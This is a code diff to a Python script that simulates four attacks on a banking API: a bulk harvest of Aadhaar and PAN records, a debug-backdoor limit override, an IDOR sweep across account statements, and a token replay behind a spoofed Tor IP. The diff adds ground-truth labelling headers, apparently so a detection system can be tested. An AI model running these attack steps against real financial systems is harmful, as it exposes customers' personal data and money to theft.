@@ -23,27 +23,32 @@ def run_attack_simulation():
     session = requests.Session()
 
     # =========================================================================
-    # Step 0: Legitimate Authentication (Priya Sharma)
+    # Step 0: Legitimate Authentication & Normal Banking (Priya Sharma)
     # =========================================================================
     print("[0/4] Attacker compromises credentials for Priya Sharma...")
     login_res = session.post(f"{BASE_URL}/api/v2/auth/login", json={
         "identifier": "priya.sharma@bharatpay.com",
         "password": "Password@123"
-    })
+    }, headers={"X-Ground-Truth": "legitimate_auth"})
     assert login_res.status_code == 200, f"Login failed: {login_res.text}"
     auth_data = login_res.json()
     token = auth_data["access_token"]
     jti = auth_data["jti"]
     account_id = auth_data["account_id"]
     headers = {"Authorization": f"Bearer {token}"}
-    print(f"      Captured Session: Account #{account_id}, JTI: {jti[:10]}...\n")
+    print(f"      Captured Session: Account #{account_id}, JTI: {jti[:10]}...")
+
+    # Legitimate customer self-service inquiry
+    self_res = session.get(f"{BASE_URL}/api/v2/accounts/{account_id}/statement", headers={**headers, "X-Ground-Truth": "legitimate"})
+    print(f"      Legitimate Account #{account_id} Statement Check: Status {self_res.status_code}\n")
+    time.sleep(0.5)
 
     # =========================================================================
     # ATTACK 1: Zombie API Mass PII Harvest
     # =========================================================================
     print("[1/4] ATTACK 1: Exploiting Zombie API (Mass Data Exfiltration)...")
     print("      Target: GET /api/v1/kyc/aadhaar-pan-dump")
-    zombie_res = session.get(f"{BASE_URL}/api/v1/kyc/aadhaar-pan-dump")
+    zombie_res = session.get(f"{BASE_URL}/api/v1/kyc/aadhaar-pan-dump", headers={"X-Ground-Truth": "attack_zombie_pii"})
     print(f"      HTTP Status: {zombie_res.status_code}")
     if zombie_res.status_code == 200:
         records = zombie_res.json()
@@ -54,6 +59,7 @@ def run_attack_simulation():
     elif zombie_res.status_code == 403:
         print(f"      [SHIELD] MITIGATED BY PERIMETER: {zombie_res.json().get('error')}")
     print()
+    time.sleep(0.5)
 
     # =========================================================================
     # ATTACK 2: Undocumented Shadow Debug Backdoor
@@ -63,7 +69,7 @@ def run_attack_simulation():
     shadow_res = session.post(
         f"{BASE_URL}/api/internal/debug/override-limit",
         json={"account_id": account_id, "new_daily_limit_paise": 2000000000},  # 2 Crore limit
-        headers={"X-Debug-Key": "dev123"}
+        headers={"X-Debug-Key": "dev123", "X-Ground-Truth": "attack_shadow"}
     )
     print(f"      HTTP Status: {shadow_res.status_code}")
     if shadow_res.status_code == 200:
@@ -72,6 +78,7 @@ def run_attack_simulation():
     elif shadow_res.status_code == 403:
         print(f"      [SHIELD] MITIGATED BY PERIMETER: {shadow_res.json().get('error')}")
     print()
+    time.sleep(0.5)
 
     # =========================================================================
     # ATTACK 3: BOLA / IDOR Horizontal Account Enumeration Sweep
@@ -81,13 +88,17 @@ def run_attack_simulation():
     probed_count = 0
     blocked_count = 0
     for victim_id in range(1002, 1016):
-        bola_res = session.get(f"{BASE_URL}/api/v2/accounts/{victim_id}/statement", headers=headers)
+        bola_res = session.get(
+            f"{BASE_URL}/api/v2/accounts/{victim_id}/statement",
+            headers={**headers, "X-Ground-Truth": "attack_bola"}
+        )
         probed_count += 1
         if bola_res.status_code == 403:
             blocked_count += 1
-        time.sleep(0.04)
+        time.sleep(0.1)
     print(f"      Completed {probed_count} unauthorized account probe attempts.")
     print(f"      BOLA Sweep Triggered telemetry across {probed_count} unique Object IDs under session {jti[:10]}!\n")
+    time.sleep(0.5)
 
     # =========================================================================
     # ATTACK 4: Credential Replay / Botnet Hijack via Tor Exit IP
@@ -109,7 +120,8 @@ def run_attack_simulation():
         headers={
             "Authorization": f"Bearer {token}",
             "X-Forwarded-For": spoofed_tor_ip,
-            "User-Agent": spoofed_bot_ua
+            "User-Agent": spoofed_bot_ua,
+            "X-Ground-Truth": "attack_replay"
         }
     )
     print(f"      HTTP Status: {replay_res.status_code}")
